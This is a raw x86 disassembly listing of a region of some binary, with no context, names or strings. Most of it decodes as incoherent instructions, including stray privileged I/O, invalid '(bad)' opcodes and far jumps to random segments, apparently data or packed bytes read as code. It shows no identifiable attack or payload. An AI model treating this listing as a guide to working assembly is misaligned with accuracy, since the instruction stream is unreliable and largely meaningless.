  41588c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41588d:	jl     0x4158c9
  41588f:	push   eax
  415890:	ins    BYTE PTR es:[edi],dx
  415891:	adc    al,0x1
  415893:	sub    BYTE PTR [ebx+ebx*2+0xb5b9691],al
  41589a:	add    bh,bl
  41589c:	outs   dx,BYTE PTR ds:[esi]
  41589d:	sbb    edx,ebx
  41589f:	pop    ebp
  4158a0:	xor    dl,BYTE PTR [edi]
  4158a2:	push   0xa84f2fcc
  4158a7:	das    
  4158a8:	xor    eax,0x7d94f1ed
  4158ad:	aaa    
  4158ae:	mov    eax,0x269698b
  4158b3:	mov    ds:0xae05e562,eax
  4158b8:	cwde   
  4158b9:	push   eax
  4158ba:	or     eax,0xd5ff0d9c
  4158bf:	cmp    ebp,esp
  4158c1:	adc    DWORD PTR [edi+0x53],edi
  4158c4:	xchg   DWORD PTR [edi-0x437e0936],ebp
  4158ca:	test   al,0xc9
  4158cc:	js     0x41594b
  4158ce:	out    0xa0,al
  4158d0:	loop   0x415906
  4158d2:	inc    eax
  4158d3:	pushf  
  4158d4:	pop    es
  4158d5:	xchg   esi,eax
  4158d6:	jns    0x4158eb
  4158d8:	pop    ebx
  4158d9:	arpl   si,cx
  4158db:	loope  0x4158c3
  4158dd:	xor    ebx,DWORD PTR [ebx-0x5d]
  4158e0:	in     al,0x3d
  4158e2:	mov    edx,ds
  4158e4:	test   bh,0xcb
  4158e7:	out    0xf9,eax
  4158e9:	dec    esi
  4158ea:	mov    dh,0xea
  4158ec:	jno    0x4158b8
  4158ee:	or     ah,BYTE PTR [edx+0x20]
  4158f1:	adc    eax,0xd645c220
  4158f6:	dec    edx
  4158f7:	jne    0x41593c
  4158f9:	test   ah,dh
  4158fb:	xor    BYTE PTR [eax],bl
  4158fd:	jl     0x415971
  4158ff:	inc    edx
  415900:	(bad)  
  415901:	adc    eax,0xb84718c3
  415906:	or     edi,DWORD PTR [eax+0x2d]
  415909:	mov    ebp,0x9c278164
  41590e:	cmp    ah,0xe4
  415911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415912:	inc    esp
  415913:	mov    WORD PTR [esi+0x1e],?
  415916:	cmp    DWORD PTR [eax],0xffffffba
  415919:	scas   eax,DWORD PTR es:[edi]
  41591a:	xor    ecx,ebp
  41591c:	out    dx,al
  41591d:	jno    0x41598d
  41591f:	mov    al,0xea
  415921:	xchg   esp,eax
  415922:	rcl    BYTE PTR [eax],0x1f
  415925:	inc    ebx
  415926:	xchg   esp,eax
  415927:	mov    BYTE PTR [edi],0xee
  41592a:	cmp    eax,0x60fc79d5
  41592f:	jo     0x41599e
  415931:	mov    ch,0xf2
  415933:	outs   dx,WORD PTR ds:[esi]
  415935:	xor    BYTE PTR [esi+0x28c673c4],dh
  41593b:	inc    ecx
  41593c:	adc    al,BYTE PTR [eax-0x63]
  41593f:	and    BYTE PTR [ebx-0x117f3683],cl
  415945:	hlt    
  415946:	xor    ebp,0x17
  415949:	push   ecx
  41594a:	mov    ebp,0xce54f59d
  41594f:	es loopne 0x415937
  415952:	loopne 0x41597e
  415954:	ret    
  415955:	int    0x7
  415957:	mov    esp,0x5dec70f
  41595c:	mov    al,0xe2
  41595e:	int3   
  41595f:	adc    DWORD PTR [ebp+0x1dd2ccd7],ebp
  415965:	add    eax,DWORD PTR [ecx+eax*2-0x5f5b0ec7]
  41596c:	in     eax,0xa8
  41596e:	pop    ss
  41596f:	and    edx,esp
  415971:	adc    BYTE PTR [esi-0x35],ch
  415974:	mov    WORD PTR [esi-0x6e6ab989],cs
  41597a:	xchg   BYTE PTR [ebx],ah
  41597c:	popa   
  41597d:	dec    eax
  41597e:	jns    0x4159cf
  415980:	xor    BYTE PTR [esi+0x225a3ff6],ah
  415986:	mov    eax,0xecd60910
  41598b:	(bad)
  41598e:	and    eax,0x35deec54
  415993:	adc    ecx,DWORD PTR [eax]
  415995:	lea    eax,[ebp-0x32]
  415998:	das    
  415999:	mov    BYTE PTR [eax+0x5b],ch
  41599c:	push   edx
  41599d:	in     eax,dx
  41599e:	xor    edx,DWORD PTR [edx+0x2a]
  4159a1:	inc    ebx
  4159a2:	push   eax
  4159a3:	mov    edi,0x490e517c
  4159a8:	hlt    
  4159a9:	fidiv  WORD PTR gs:[ecx+eiz*1+0x4b]
  4159ae:	ja     0x4159e7
  4159b0:	adc    eax,0xb00f0d4c
  4159b5:	and    eax,0x7203cfde
  4159ba:	sub    esi,DWORD PTR [ebx]
  4159bc:	ror    DWORD PTR [edx-0x38],0xbd
  4159c0:	xor    cl,al
  4159c2:	ds mov ebp,0x29fb371d
  4159c8:	dec    esp
  4159c9:	pop    es
  4159ca:	jmp    0x8f95:0x72673b10
  4159d1:	inc    eax
  4159d2:	sbb    eax,DWORD PTR ds:0x6ea9948d
  4159d8:	and    esi,ebx
  4159da:	popf   
  4159db:	aaa    
  4159dc:	adc    DWORD PTR [eax-0x67],edx
  4159df:	ins    BYTE PTR es:[edi],dx
  4159e0:	cmp    ebx,ebp
  4159e2:	ret    0x80d4
  4159e5:	xor    BYTE PTR [esi+eiz*8+0x3e1f39ec],al
  4159ec:	mov    dh,0x55
  4159ee:	pop    ds
  4159ef:	xchg   edx,eax
  4159f0:	sahf   
  4159f1:	ror    DWORD PTR [ebx+0x43bb16f2],1
  4159f7:	es dec esp
  4159f9:	sub    al,0x6f
  4159fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159fc:	jecxz  0x4159e1
  4159fe:	xchg   ebx,eax
  4159ff:	cdq    
  415a00:	rcr    BYTE PTR [eax-0x75],cl
  415a03:	int3   
  415a04:	mov    dl,BYTE PTR [edx+ebx*4+0x7b06d427]
  415a0b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0d:	mov    DWORD PTR [edi],ecx
  415a0f:	jae    0x4159f6
  415a11:	repnz adc ebp,DWORD PTR [ecx-0x78e00f1b]
  415a18:	inc    edx
  415a19:	shr    DWORD PTR [eax+0x1c24945c],1
  415a1f:	pop    es
  415a20:	neg    DWORD PTR [ebx+0x32e0504]
  415a26:	test   DWORD PTR [esp+eax*8],ebx
  415a29:	cmp    bh,bl
  415a2b:	(bad)  
  415a2c:	int    0x18
  415a2e:	inc    eax
  415a2f:	mov    ebp,DWORD PTR [esi+edi*1-0x4af5638d]
  415a36:	sub    ecx,eax
  415a38:	aam    0xa7
  415a3a:	push   ebp
  415a3b:	jg     0x415a40
  415a3d:	jl     0x415a66
  415a3f:	icebp  
  415a40:	popf   
  415a41:	arpl   bx,ax
  415a43:	mul    ch
  415a45:	inc    ecx
  415a46:	enter  0x3ea5,0x49
  415a4a:	dec    esp
  415a4b:	push   0x43392d3e
  415a50:	xchg   ecx,eax
  415a51:	stos   BYTE PTR es:[edi],al
  415a52:	inc    ecx
  415a53:	cmp    esp,DWORD PTR [ebx+0x3424d2e7]
  415a59:	and    eax,0xe09745b8
  415a5e:	and    esp,DWORD PTR [edi+0x7f7fb109]
  415a64:	nop
  415a65:	jg     0x415a05
  415a67:	jbe    0x415ada
  415a69:	push   esi
  415a6a:	not    DWORD PTR [eax-0x4059b778]
  415a70:	cld    
  415a71:	sar    BYTE PTR [ebx+0x582c7985],1
  415a77:	pop    ecx
  415a78:	pop    esi
  415a79:	mov    dl,BYTE PTR [edx-0x18]
  415a7c:	sbb    ecx,DWORD PTR [eax+0x342c95d]
  415a82:	into   
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	imul   ecx,DWORD PTR [ecx+0x574ec790],0x7d
  415ab6:	jp     0x415ac2
  415ab8:	pop    edi
  415ab9:	jp     0x415b35
  415abb:	push   ebx
  415abc:	pusha  
  415abd:	lds    esi,FWORD PTR [ebp-0x5ebcb65d]
  415ac3:	rol    DWORD PTR [ebp-0x52a51e19],1
  415ac9:	cmp    ebx,DWORD PTR [ebx]
  415acb:	sub    ebx,DWORD PTR [esi-0x4c]
  415ace:	sti    
  415acf:	jle    0x415aef
  415ad1:	pop    ss
  415ad2:	ror    DWORD PTR [eax+0x1f],0x5e
  415ad6:	es mov eax,ecx
  415ad9:	aas    
  415ada:	cs into 
  415adc:	(bad)  
  415ade:	pop    es
  415adf:	adc    dl,BYTE PTR [esi+0x544dac13]
  415ae5:	mov    ch,0xf1
  415ae7:	aam    0x2c
  415ae9:	ss pop ebx
  415aeb:	lods   al,BYTE PTR ds:[esi]
  415aec:	fst    QWORD PTR [esi+eax*8]
  415aef:	aad    0x9f
  415af1:	in     al,0xa2
  415af3:	inc    esp
  415af4:	out    dx,eax
  415af5:	jmp    0x415b71
  415af7:	jae    0x415b25
  415af9:	aas    
  415afa:	pop    edx
  415afb:	(bad)  
  415afc:	ins    BYTE PTR es:[edi],dx
  415afd:	cwde   
  415afe:	dec    ebp
  415aff:	mov    ecx,0x2d1dbc5
  415b04:	mov    ch,0x14
  415b06:	mov    al,ds:0x9756a5c8
  415b0b:	xchg   ebx,eax
  415b0c:	das    
  415b0d:	enter  0x278e,0x58
  415b11:	cs jbe 0x415b5a
  415b14:	aam    0x36
  415b16:	push   ecx
  415b17:	stc    
  415b18:	repz cli 
  415b1a:	pop    es
  415b1b:	call   0x4ac182d7
  415b20:	pop    ebp
  415b21:	adc    al,0xc9
  415b23:	stos   DWORD PTR es:[edi],eax
  415b24:	mov    ?,esp
  415b26:	in     al,dx
  415b27:	(bad)  
  415b28:	cdq    
  415b29:	jns    0x415b83
  415b2b:	jle    0x415b84
  415b2d:	scas   al,BYTE PTR es:[edi]
  415b2e:	popa   
  415b2f:	repnz mov es,WORD PTR [edx+0x7b]
  415b33:	jecxz  0x415b4e
  415b35:	push   ss
  415b36:	mov    ?,WORD PTR [edx-0x6b958d86]
  415b3c:	icebp  
  415b3d:	mov    ds:0x20bef717,eax
  415b42:	test   BYTE PTR [eax+0x510f6d80],dh
  415b48:	data16 jecxz 0x415b49
  415b4b:	sbb    DWORD PTR [esp+ecx*1+0x10],0xffffff98
  415b50:	repnz push ss
  415b52:	mov    esi,DWORD PTR [ebx]
  415b54:	push   eax
  415b55:	inc    edi
  415b56:	(bad)  
  415b58:	or     al,0x35
  415b5a:	std    
  415b5b:	lods   eax,DWORD PTR ds:[esi]
  415b5c:	cmp    dh,cl
  415b5e:	mov    edx,0xad1fbdbb
  415b63:	fisttp QWORD PTR [eax+0x47]
  415b66:	arpl   WORD PTR [ecx],ax
  415b68:	ja     0x415b78
  415b6a:	sti    
  415b6b:	test   DWORD PTR [ebp-0x71dfe180],eax
  415b71:	add    DWORD PTR [esi+0x27a13b3f],ebp
  415b77:	or     esi,DWORD PTR [eax]
  415b79:	inc    ecx
  415b7a:	ret    0xf9a2
  415b7d:	mov    esi,DWORD PTR [edx-0x52e6bb02]
  415b83:	mov    esi,0xb59c47fd
  415b88:	lock ret 
  415b8a:	mov    ebx,0x9d51f764
  415b8f:	retf   
  415b90:	ins    DWORD PTR es:[edi],dx
  415b91:	sahf   
  415b92:	lea    ebp,[esi]
  415b94:	icebp  
  415b95:	std    
  415b96:	mov    ch,BYTE PTR [edx-0x1928c61a]
  415b9c:	icebp  
  415b9d:	sar    BYTE PTR [eax],0xd4
  415ba0:	sub    al,BYTE PTR [ecx+eiz*1]
  415ba3:	mov    ebx,DWORD PTR [edi-0x7ae33cb3]
  415ba9:	xor    bl,dl
  415bab:	in     eax,0xd8
  415bad:	and    BYTE PTR [edx+0x58e424],dh
  415bb3:	daa    
  415bb4:	retf   0x3b16
  415bb7:	(bad)  
  415bb9:	xor    cl,BYTE PTR [ecx+0x4d]
  415bbc:	pushf  
  415bbd:	fsubr  DWORD PTR [ebx+ebp*2+0x7aeb6e25]
  415bc4:	shl    bl,1
  415bc6:	repz test al,0x11
  415bc9:	ds xchg edx,eax
  415bcb:	xchg   ebx,eax
  415bcc:	adc    BYTE PTR [ecx],al
  415bce:	sbb    eax,0x86b26810
  415bd3:	push   cs
  415bd4:	mov    ebp,ebx
  415bd6:	mov    ds:0xe8e707c,al
  415bdb:	cmp    eax,0x23fc0225
  415be0:	mov    ds:0xe00c2eb3,eax
  415be5:	cmp    DWORD PTR [esi+0x3b],edi
  415be8:	inc    edx
  415be9:	xor    dh,ah
  415beb:	stos   DWORD PTR es:[edi],eax
  415bec:	pop    esi
  415bed:	jg     0x415c13
  415bef:	jl     0x415b8a
  415bf1:	sub    esp,DWORD PTR [edx+0x7]
  415bf4:	fisub  DWORD PTR [edi-0x46cddb08]
  415bfa:	mov    ds:0x9f8bd8a8,al
  415bff:	mov    ds:0x7db738dc,al
  415c04:	outs   dx,BYTE PTR ds:[esi]
  415c05:	ffree  st(5)
  415c07:	add    eax,0x86446bc9
  415c0c:	nop
  415c0d:	loopne 0x415bfb
  415c0f:	fldcw  WORD PTR [ebx+esi*4-0x58]
  415c13:	sub    BYTE PTR [ecx+0x4c17275a],0x39
  415c1a:	pop    ss
  415c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c1c:	leave  
  415c1d:	into   
  415c1e:	lods   eax,DWORD PTR ds:[esi]
  415c1f:	and    BYTE PTR [ecx-0x2b462d49],dl
  415c25:	in     eax,dx
  415c26:	dec    eax
  415c27:	sub    al,0xc8
  415c29:	pop    esp
  415c2a:	shl    BYTE PTR [esi],0x92
  415c2d:	(bad)  
  415c2e:	cmp    al,BYTE PTR [ebx]
  415c30:	inc    ecx
  415c31:	dec    esi
  415c32:	and    edi,DWORD PTR [ebx-0x15f4a76e]
  415c38:	xor    al,BYTE PTR [bp+0x4f]
  415c3c:	adc    ebx,DWORD PTR [ebp+0x3216899c]
  415c42:	adc    DWORD PTR [ebp+0x20],eax
  415c45:	repz xor bh,BYTE PTR [esi]
  415c48:	jg     0x415bf6
  415c4a:	scas   al,BYTE PTR es:[edi]
  415c4b:	push   ecx
  415c4c:	mov    DWORD PTR [ebx],esi
  415c4e:	nop
  415c4f:	ja     0x415c8c
  415c51:	test   al,0x49
  415c53:	jb     0x415bd8
  415c55:	mov    esp,0xffe1982
  415c5a:	dec    ebx
  415c5b:	pop    eax
  415c5c:	cs add ebp,ecx
  415c5f:	retf   
  415c60:	xchg   esp,eax
  415c61:	mov    esp,0xe2b62469
  415c66:	rcl    eax,1
  415c68:	imul   ebp,esi,0x8ddbf27f
  415c6e:	add    ebp,DWORD PTR [esi+eax*1-0x7136e9de]
  415c75:	hlt    
  415c76:	and    eax,0x661591e9
  415c7b:	xor    ecx,DWORD PTR [ecx-0x3dc97e1f]
  415c81:	pusha  
  415c82:	sbb    al,0xb5
  415c84:	sbb    al,0x33
  415c86:	fst    st(7)
  415c88:	xor    BYTE PTR [edx+0x17bbd813],al
  415c8e:	mov    dl,0x18
  415c90:	push   ss
  415c91:	into   
  415c92:	in     eax,0xcb
  415c94:	scas   al,BYTE PTR es:[edi]
  415c95:	out    dx,al
  415c96:	sbb    esp,DWORD PTR [ecx-0x53f9c875]
  415c9c:	bnd jl 0x415cd6
  415c9f:	call   0x94d1:0x518ea46a
  415ca6:	xchg   ecx,eax
  415ca7:	cmp    ch,ah
  415ca9:	scas   al,BYTE PTR es:[edi]
  415caa:	repnz mov dl,0xef
  415cad:	xchg   ebx,eax
  415cae:	pop    ds
  415caf:	loopne 0x415c81
  415cb1:	(bad)  
  415cb3:	mov    dl,0x67
  415cb5:	add    esp,ecx
  415cb7:	arpl   cx,cx
  415cb9:	xor    dl,al
  415cbb:	repz rcr BYTE PTR [ecx-0x1c],cl
  415cbf:	sar    BYTE PTR [ebx-0x35],cl
  415cc2:	xchg   ebx,eax
  415cc3:	ror    cl,cl
  415cc5:	sub    eax,0x25d19177
  415cca:	or     al,0xa2
  415ccc:	inc    ebp
  415ccd:	adc    al,0x7a
  415ccf:	test   eax,0x4040fe39
  415cd4:	mov    bh,0xf6
  415cd6:	addr16 jle 0x415d08
  415cd9:	popa   
  415cda:	add    cl,BYTE PTR [edi-0x55e6d7b5]
  415ce0:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ce2:	sahf   
  415ce3:	outs   dx,BYTE PTR ds:[esi]
  415ce4:	shl    al,0x5
  415ce7:	test   al,0xa0
  415ce9:	cmp    bl,BYTE PTR [edx-0x8e691f5]
  415cef:	hlt    
  415cf0:	xchg   edx,eax
  415cf1:	push   0xffffffcd
  415cf3:	(bad)  
  415cf4:	push   edi
  415cf5:	mov    ds:0x29fa0e79,eax
  415cfa:	inc    DWORD PTR [esi-0x1f]
  415cfd:	or     dl,BYTE PTR [eax-0x3b]
  415d00:	jle    0x415d3a
  415d02:	mov    eax,ds:0xa5a72f07
  415d07:	adc    ch,BYTE PTR [ebx+ebx*8+0x51]
  415d0b:	clc    
  415d0c:	mov    dh,0xc
  415d0e:	mov    eax,ds:0xae1bf7f9
  415d13:	jecxz  0x415d31
  415d15:	xchg   esp,eax
  415d16:	and    al,0x2b
  415d18:	add    eax,0xac0bd8d6
  415d1d:	jne    0x415d62
  415d1f:	cmp    DWORD PTR [esi-0x4c],ecx
  415d22:	mov    eax,0x13bcae17
  415d27:	sub    ah,al
  415d29:	pop    ebx
  415d2a:	outs   dx,DWORD PTR ds:[esi]
  415d2b:	mov    ah,0xd6
  415d2d:	adc    al,0x93
  415d2f:	jl     0x415d15
  415d31:	out    dx,al
  415d32:	push   edx
  415d33:	pop    edx
  415d34:	int3   
  415d35:	sub    ebp,DWORD PTR [ebx]
  415d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d38:	cmp    esp,esp
  415d3a:	icebp  
  415d3b:	sub    al,0xbc
  415d3d:	iret   
  415d3e:	inc    esp
  415d3f:	add    eax,0x5f9ea15c
  415d44:	addr16 and eax,0xdf909f3c
  415d4a:	sub    BYTE PTR [edi-0x1a16471b],cl
  415d50:	xchg   ebp,eax
  415d51:	in     eax,0xb7
  415d53:	jns    0x415d3e
  415d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d56:	arpl   WORD PTR [ebx-0x2b],bx
  415d59:	and    BYTE PTR [eax],cl
  415d5b:	mov    cl,BYTE PTR ds:0x4fd9ae92
  415d61:	mov    BYTE PTR [ebp-0x26],dl
  415d64:	mov    al,0xe2
  415d66:	mov    cl,0xe0
  415d68:	fistp  QWORD PTR [ebx]
  415d6a:	and    eax,0xc4c5272b
  415d6f:	push   es
  415d70:	das    
  415d71:	pop    ebx
  415d72:	sub    edi,DWORD PTR [edx+0x127b7b3d]
  415d78:	outs   dx,DWORD PTR ds:[esi]
  415d79:	pop    esi
  415d7a:	xor    bl,bh
  415d7c:	adc    al,0x5
  415d7e:	aam    0x8c
  415d80:	cli    
  415d81:	pop    esi
  415d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d83:	inc    DWORD PTR [ecx]
  415d85:	scas   al,BYTE PTR es:[edi]
  415d86:	mov    edi,0x3ff94503
  415d8b:	adc    ch,BYTE PTR ds:0x12402451
  415d91:	dec    eax
  415d92:	mov    ds:0x2e979fe4,eax
  415d97:	call   0x339e:0xea0c7ac7
  415d9e:	jo     0x415d7d
  415da0:	lea    eax,[ebx-0x7416aa92]
  415da6:	or     DWORD PTR [eax],edi
  415da8:	call   FWORD PTR ds:0xa2b0f1ad
  415dae:	xchg   ecx,eax
  415daf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db0:	popa   
  415db1:	pop    es
  415db2:	push   ds
  415db3:	lahf   
  415db4:	popa   
  415db5:	cdq    
  415db6:	or     BYTE PTR [eax+0x33],bl
  415db9:	xchg   ebx,edx
  415dbb:	ins    DWORD PTR es:[edi],dx
  415dbc:	mov    ch,0x16
  415dbe:	sbb    BYTE PTR [ebx],0xc5
  415dc1:	mov    bh,0x6c
  415dc3:	aaa    
  415dc4:	cli    
  415dc5:	adc    DWORD PTR [esi],esi
  415dc7:	xchg   edi,eax
  415dc8:	sbb    dl,ch
  415dca:	add    BYTE PTR [edi+edx*8],al
  415dcd:	fsubr  DWORD PTR [edx-0x7e]
  415dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dd1:	inc    ecx
  415dd2:	jp     0x415dec
  415dd4:	add    esp,ebp
  415dd6:	icebp  
  415dd7:	fsub   QWORD PTR [ebx+0x6a4cc80e]
  415ddd:	aad    0x88
  415ddf:	test   BYTE PTR [esi+0x5f157d70],dl
  415de5:	push   0xf3c24416
  415dea:	mov    ebx,0x590c86ee
  415def:	jns    0x415df5
  415df1:	adc    al,0x3
  415df3:	mov    edx,0xfa1fcbee
  415df8:	int3   
  415df9:	daa    
  415dfa:	dec    eax
  415dfb:	sar    DWORD PTR [eax],cl
  415dfd:	xchg   DWORD PTR [edi-0x18baace6],esi
  415e03:	into   
  415e04:	mov    ds:0xd0b875ea,al
  415e09:	scas   eax,DWORD PTR es:[edi]
  415e0a:	xchg   edx,eax
  415e0b:	push   ebp
  415e0c:	xchg   ah,ah
  415e0e:	push   ds
  415e0f:	xor    eax,0x220f9cc5
  415e14:	arpl   di,bp
  415e16:	push   esp
  415e17:	leavew 
  415e19:	inc    ebx
  415e1a:	add    ebx,DWORD PTR [edx+eax*1]
  415e1d:	mov    BYTE PTR [edx+0x12],dl
  415e20:	clc    
  415e21:	aad    0xb9
  415e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e24:	pop    ecx
  415e25:	mov    ch,0xbb
  415e27:	mov    al,0xa7
  415e29:	stc    
  415e2a:	push   ebx
  415e2b:	pushf  
  415e2c:	mov    dl,0x61
  415e2e:	jo     0x415e4f
  415e30:	mov    al,0x5f
  415e32:	fadd   QWORD PTR [eax+0x2be9e1e8]
  415e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e39:	aaa    
  415e3a:	or     eax,0xe33c2927
  415e3f:	inc    edi
  415e40:	jb     0x415de8
  415e42:	jl     0x415e0a
  415e44:	xor    ebp,0xfffffff7
  415e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e48:	fwait
  415e49:	std    
  415e4a:	add    DWORD PTR [ebx],edi
  415e4c:	and    DWORD PTR [ecx+0x20],ebx
  415e4f:	int    0xce
  415e51:	jl     0x415e8b
  415e53:	dec    eax
  415e54:	push   ds
  415e55:	scas   al,BYTE PTR es:[edi]
  415e56:	add    al,0xa3
  415e58:	std    
  415e59:	or     edx,ecx
  415e5b:	push   es
  415e5c:	jno    0x415e51
  415e5e:	mov    ebx,0x2b9e4d06
  415e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e64:	mov    bl,0xb2
  415e66:	ins    DWORD PTR es:[edi],dx
  415e67:	gs pushf 
  415e69:	sbb    ebx,ebp
  415e6b:	aaa    
  415e6c:	repz test DWORD PTR fs:[eax],ebp
  415e70:	daa    
  415e71:	jle    0xbe70585d
  415e77:	add    DWORD PTR [ebp+0x1d7c7fe3],esi
  415e7d:	iret   
  415e7e:	xlat   BYTE PTR ds:[ebx]
  415e7f:	and    BYTE PTR ds:0x348cf0d7,0x29
  415e86:	push   edi
  415e87:	ror    DWORD PTR [edx+0x2b],0x31
  415e8b:	cmp    eax,DWORD PTR ds:[edi-0x4648858f]
  415e92:	ret    
  415e93:	call   0xf7e7ad75
  415e98:	cld    
  415e99:	or     bh,bh
  415e9b:	and    eax,eax
  415e9d:	hlt    
  415e9e:	or     eax,0xe4ef78cb
  415ea3:	dec    esp
  415ea4:	shl    ecx,cl
  415ea6:	test   eax,0xd00fdc5f
  415eab:	repz dec ebx
  415ead:	into   
  415eae:	shl    DWORD PTR [esi+0x31],0xb5
  415eb2:	pop    edx
  415eb3:	pop    edx
  415eb4:	xchg   edx,eax
  415eb5:	out    dx,al
  415eb6:	fwait
  415eb7:	push   es
  415eb8:	shr    ebp,1
  415eba:	repnz daa 
  415ebc:	arpl   WORD PTR [ecx],di
  415ebe:	or     BYTE PTR [eax+0x12e17cab],0xae
  415ec5:	add    al,0x7d
  415ec7:	int3   
  415ec8:	add    DWORD PTR [esi-0x9],ecx
  415ecb:	jno    0x415e4d
  415ecd:	sbb    BYTE PTR [esi],dh
  415ecf:	enter  0x76d8,0xbe
  415ed3:	(bad)  
  415ed4:	jno    0x415f4b
  415ed6:	push   es
  415ed7:	and    BYTE PTR [edx-0x31],ah
  415eda:	rcl    BYTE PTR [edx-0x61],0xfd
  415ede:	push   esi
  415edf:	pop    edx
  415ee0:	in     al,0xf3
  415ee2:	push   esp
  415ee3:	dec    edi
  415ee4:	ins    BYTE PTR es:[edi],dx
  415ee5:	jns    0x415f11
  415ee7:	jle    0x415efc
  415ee9:	shl    bl,cl
  415eeb:	scas   eax,DWORD PTR es:[edi]
  415eec:	pop    ds
  415eed:	clc    
  415eee:	loop   0x415ef1
  415ef0:	aam    0x48
  415ef2:	mov    esi,0x7a9a77e7
  415ef7:	mov    edx,0xce04d7b7
  415efc:	and    ecx,esp
  415efe:	cdq    
  415eff:	mov    ah,0xbf
  415f01:	mov    cl,bl
  415f03:	push   ebx
  415f04:	repnz das 
  415f06:	adc    BYTE PTR [eax-0x7],bh
  415f09:	ins    BYTE PTR es:[edi],dx
  415f0a:	ja     0x415f41
  415f0c:	mov    WORD PTR ds:0x7b7883f1,fs
  415f12:	or     bl,BYTE PTR [ebp-0x6f2212c7]
  415f18:	and    eax,0x5ce2dabf
  415f1d:	xchg   BYTE PTR [edi+0x59],bh
  415f20:	mov    ebx,0x21463048
  415f25:	jmp    0xafacc3fa
  415f2a:	es in  al,0x5e
  415f2d:	fild   QWORD PTR [edx-0x44]
  415f30:	scas   al,BYTE PTR es:[edi]
  415f31:	pusha  
  415f32:	popf   
  415f33:	into   
  415f34:	mov    dh,BYTE PTR [eax+0x512b5b27]
  415f3a:	cmp    al,0x75
  415f3c:	or     eax,0xc02862b8
  415f41:	test   al,0x6f
  415f43:	mov    ds,WORD PTR [edi]
  415f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f46:	loopne 0x415f7f
  415f48:	rcl    DWORD PTR [ebx],0xbf
  415f4b:	(bad)
  415f4f:	jecxz  0x415eec
  415f51:	out    dx,al
  415f52:	rcl    eax,0xe8
  415f55:	idiv   cl
  415f57:	nop
  415f58:	xchg   ecx,eax
  415f59:	inc    ebp
  415f5a:	clc    
  415f5b:	jno    0x415f06
  415f5d:	xor    DWORD PTR [esi+ecx*8],esi
  415f60:	mov    bl,cl
  415f62:	mov    esi,0xb00fe0e3
  415f67:	push   cs
  415f68:	cmp    ch,BYTE PTR [esi+eiz*8]
  415f6b:	fstp   TBYTE PTR [ecx-0x6d9a6540]
  415f71:	loopne 0x415fa0
  415f73:	jno    0x415f21
  415f75:	xchg   DWORD PTR [ebx],ecx
  415f77:	pop    ecx
  415f78:	fs pop eax
  415f7a:	outs   dx,BYTE PTR ds:[esi]
  415f7b:	push   0xeed73c18
  415f80:	call   0x5262:0x5bc4d14
  415f87:	mov    ch,0xc9
  415f89:	push   esi
  415f8a:	cmp    ebp,DWORD PTR [ecx+0x3c36d227]
  415f90:	daa    
  415f91:	pop    esi
  415f92:	in     al,0xe5
  415f94:	sbb    dh,cl
  415f96:	adc    esi,DWORD PTR [ecx-0x41]
  415f99:	outs   dx,BYTE PTR ds:[esi]
  415f9a:	mov    cl,0xfb
  415f9c:	cld    
  415f9d:	sub    al,ah
  415f9f:	pop    edi
  415fa0:	sub    al,0x9
  415fa2:	out    0x64,eax
  415fa4:	mov    eax,DWORD PTR [edx-0x16a7081e]
  415faa:	fnstcw WORD PTR [edx]
  415fac:	imul   eax,DWORD PTR [esi+0x4ea8aca9],0xbbb95df6
  415fb6:	xor    BYTE PTR [edx+0x1fb96ab0],al
  415fbc:	stos   BYTE PTR es:[edi],al
  415fbd:	push   ds
  415fbe:	sub    eax,0x35f8e232
  415fc3:	pop    esp
  415fc4:	mov    eax,0xfbac806c
  415fc9:	push   es
  415fca:	dec    ebp
  415fcb:	test   eax,0xa98cfa7f
  415fd0:	in     eax,dx
  415fd1:	ror    BYTE PTR [edx+0x4ce28972],0xb8
  415fd8:	in     al,dx
  415fd9:	inc    eax
  415fda:	(bad)  
  415fdb:	jl     0x415f82
  415fdd:	mov    cl,0xf
  415fdf:	ret    
  415fe0:	retf   0x3689
  415fe3:	shl    DWORD PTR [eax],cl
  415fe5:	jle    0x41603f
  415fe7:	das    
  415fe8:	mov    eax,ds:0x4d383474
  415fed:	mov    edx,0x2fe152e5
  415ff2:	mov    esp,0xd063f7e9
  415ff7:	xor    eax,0x14ff69b2
  415ffc:	inc    edi
  415ffd:	push   ebp
  415ffe:	idiv   DWORD PTR [edi-0x3c3533ce]
  416004:	inc    edx
  416005:	repnz imul ebx,DWORD PTR [eax-0x1],0x975dd8f
  41600d:	cmp    al,BYTE PTR [edi-0x4c]
  416010:	xor    DWORD PTR [ebx],edx
  416012:	jo     0x415fa2
  416014:	jmp    FWORD PTR [ebx-0x37]
  416017:	repz mov dh,0xfd
  41601a:	cmp    DWORD PTR [eax+0x56de6cd7],eax
  416020:	mov    eax,ds:0xbcb8f0d7
  416025:	out    0xa9,eax
  416027:	adc    al,dh
  416029:	pop    ds
  41602a:	jecxz  0x415fcd
  41602c:	push   ss
  41602d:	cli    
  41602e:	cmp    edx,DWORD PTR [ecx-0x12]
  416031:	popa   
  416032:	and    eax,DWORD PTR [ecx+eiz*1+0x5]
  416036:	add    esp,DWORD PTR [ebx-0x62]
  416039:	aad    0x27
